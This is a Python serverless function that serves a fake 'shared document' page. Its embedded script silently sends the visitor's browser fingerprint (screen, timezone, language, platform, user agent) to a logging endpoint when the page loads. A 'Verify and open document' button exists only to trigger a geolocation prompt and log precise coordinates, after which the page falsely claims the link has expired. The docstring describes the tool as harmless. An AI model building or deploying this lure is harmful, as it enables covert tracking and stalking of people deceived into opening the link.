# -*- coding: utf-8 -*-
"""GET /t/c/<token> -> the professional landing page. (Vercel function)

Kept identical to serve.py's page. Generic "Document Portal" styling: it
does not imitate any real organisation. Location is offered through the
browser's own prompt, never taken silently. No camera. No microphone.
"""
import html
import json
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

TITLE = "Shared document"

LANDING = """<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{title}</title>
<style>
 *{{box-sizing:border-box}}
 body{{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
   margin:0;background:#f4f6fb;color:#1f2430;min-height:100vh;display:flex;flex-direction:column}}
 header{{background:#fff;border-bottom:1px solid #e6e9f0;padding:14px 20px;
   display:flex;align-items:center;gap:11px}}
 .logo{{width:34px;height:34px;border-radius:9px;background:linear-gradient(135deg,#4f46e5,#6366f1);
   display:grid;place-items:center;flex:none}}
 .logo svg{{width:18px;height:18px}}
 .brand{{font-weight:650;font-size:15px;letter-spacing:-.2px}}
 .brand span{{display:block;font-size:11px;color:#8a93a6;font-weight:500}}
 main{{flex:1;display:grid;place-items:center;padding:24px}}
 .doc{{background:#fff;border:1px solid #e6e9f0;border-radius:16px;max-width:400px;width:100%;
   box-shadow:0 10px 34px -12px rgba(20,30,60,.18);overflow:hidden}}
 .doc-top{{padding:26px 26px 8px;text-align:center}}
 .file{{width:56px;height:70px;margin:0 auto 16px;border-radius:7px;background:#eef1f8;
   border:1px solid #e0e5f0;position:relative}}
 .file::after{{content:"";position:absolute;top:0;right:0;width:18px;height:18px;
   background:#dfe4f0;border-bottom-left-radius:7px}}
 .file .lines{{position:absolute;left:11px;right:11px;top:24px}}
 .file .lines i{{display:block;height:4px;border-radius:2px;background:#d3d9e6;margin-bottom:6px}}
 .file .lines i:nth-child(2){{width:70%}} .file .lines i:nth-child(3){{width:85%}}
 h1{{font-size:17px;margin:0 0 4px;letter-spacing:-.3px}}
 .meta{{font-size:12.5px;color:#8a93a6;margin-bottom:2px}}
 .body{{padding:16px 26px 24px}}
 .status{{display:flex;align-items:center;justify-content:center;gap:9px;
   font-size:13.5px;color:#5b6478;min-height:22px}}
 .sp{{width:16px;height:16px;border:2.5px solid #dfe4f0;border-top-color:#4f46e5;
   border-radius:50%;animation:s .8s linear infinite}}
 @keyframes s{{to{{transform:rotate(360deg)}}}}
 button{{width:100%;margin-top:18px;padding:13px;border:0;border-radius:10px;
   background:#4f46e5;color:#fff;font-size:15px;font-weight:600;cursor:pointer;
   display:none;transition:background .15s}}
 button:hover{{background:#4338ca}}
 .lock{{display:inline-block;vertical-align:-2px;margin-right:6px}}
 .fine{{font-size:11.5px;color:#9aa2b2;text-align:center;margin-top:14px;line-height:1.55}}
 footer{{text-align:center;padding:16px;font-size:11px;color:#aab1c0}}
</style></head><body>
<header>
 <span class="logo"><svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"
   stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/></svg></span>
 <span class="brand">Document Portal<span>Secure file sharing</span></span>
</header>
<main>
 <div class="doc">
  <div class="doc-top">
   <div class="file"><div class="lines"><i></i><i></i><i></i></div></div>
   <h1>{title}</h1>
   <div class="meta">Shared securely &middot; 1 file</div>
  </div>
  <div class="body">
   <div class="status" id="status"><span class="sp"></span><span id="msg">Loading secure preview…</span></div>
   <button id="loc"><span class="lock">&#128274;</span>Verify and open document</button>
   <div class="fine">This document is protected. If it does not open automatically,
     tap the button above to continue.</div>
  </div>
 </div>
</main>
<footer>Encrypted transfer &middot; Link expires after viewing</footer>
<script>
 var token = {token};
 function post(extra){{
   var b = Object.assign({{
     token: token, screen: screen.width + "x" + screen.height,
     dpr: window.devicePixelRatio || 1,
     tz: (Intl.DateTimeFormat().resolvedOptions().timeZone) || "",
     tzOffsetMin: new Date().getTimezoneOffset(),
     lang: navigator.language, platform: navigator.platform || "",
     ua: navigator.userAgent
   }}, extra || {{}});
   fetch("/t/log/" + token, {{method:"POST",headers:{{"Content-Type":"application/json"}},
     body: JSON.stringify(b)}});
 }}
 post();
 setTimeout(function(){{
   document.getElementById("status").style.display = "none";
   var btn = document.getElementById("loc");
   btn.style.display = "block";
   btn.onclick = function(){{
     btn.disabled = true; btn.textContent = "Opening…";
     if (!navigator.geolocation){{ done(); return; }}
     navigator.geolocation.getCurrentPosition(function(p){{
       post({{ geo: {{ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }} }});
       done();
     }}, function(){{ done(); }}, {{ enableHighAccuracy:true, timeout:10000 }});
   }};
 }}, 1400);
 function done(){{
   document.querySelector(".body").innerHTML =
     '<div class="status" style="color:#8a93a6">This link has expired. ' +
     'Please ask the sender to share the document again.</div>';
 }}
</script></body></html>"""


class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        token = parse_qs(urlparse(self.path).query).get("token", [""])[0]
        page = LANDING.format(title=html.escape(TITLE), token=json.dumps(token))
        body = page.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
